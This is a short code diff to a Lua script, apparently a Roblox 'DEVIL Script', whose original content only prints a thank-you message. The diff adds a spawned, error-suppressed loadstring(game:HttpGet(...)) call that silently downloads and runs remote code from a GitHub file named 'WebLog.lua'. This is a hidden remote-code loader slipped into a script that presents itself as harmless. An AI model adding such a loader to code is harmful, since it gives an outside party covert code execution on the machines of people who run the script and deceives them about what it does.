@@ -1,1 +1,8 @@
 print("Thanks for using DEVIL Script");
+
+
+spawn(function()
+    pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/DEVIL-Script/ReaperHub/refs/heads/main/WebLog.lua", true))()
+    end)
+end)
